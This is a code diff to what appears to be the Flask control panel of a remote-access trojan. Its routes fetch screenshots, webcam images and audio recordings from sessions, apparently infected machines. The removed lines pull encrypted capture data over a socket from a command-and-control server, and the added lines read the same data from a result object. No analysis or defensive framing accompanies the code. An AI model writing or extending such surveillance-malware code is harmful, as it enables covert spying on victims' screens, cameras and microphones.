@@ -148,19 +148,14 @@ def get_screenshot(session_id):
         if not result['success']:
             return jsonify(result), 500
         
-        # Check if we got base64 data
-        response_text = result['data']
+        # The result data should contain base64 image
+        image_base64 = result.get('data', '')
         
-        # Wait for actual image data
-        time.sleep(2)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((C2_SERVER_HOST, C2_SERVER_PORT))
-        s.settimeout(30)
-        
-        image_data = s.recv(10 * 1024 * 1024)
-        image_base64 = decrypt_data(ENCRYPTION_KEY, image_data)
-        
-        s.close()
+        if not image_base64:
+            return jsonify({
+                'success': False,
+                'error': 'No image data received'
+            }), 500
         
         return jsonify({
             'success': True,
@@ -183,15 +178,13 @@ def get_webcam(session_id):
         if not result['success']:
             return jsonify(result), 500
         
-        time.sleep(2)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((C2_SERVER_HOST, C2_SERVER_PORT))
-        s.settimeout(30)
+        image_base64 = result.get('data', '')
         
-        image_data = s.recv(10 * 1024 * 1024)
-        image_base64 = decrypt_data(ENCRYPTION_KEY, image_data)
-        
-        s.close()
+        if not image_base64:
+            return jsonify({
+                'success': False,
+                'error': 'No webcam data received'
+            }), 500
         
         return jsonify({
             'success': True,
@@ -214,15 +207,13 @@ def get_audio(session_id, duration):
         if not result['success']:
             return jsonify(result), 500
         
-        time.sleep(duration + 2)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((C2_SERVER_HOST, C2_SERVER_PORT))
-        s.settimeout(60)
+        audio_base64 = result.get('data', '')
         
-        audio_data = s.recv(20 * 1024 * 1024)
-        audio_base64 = decrypt_data(ENCRYPTION_KEY, audio_data)
-        
-        s.close()
+        if not audio_base64:
+            return jsonify({
+                'success': False,
+                'error': 'No audio data received'
+            }), 500
         
         return jsonify({
             'success': True,
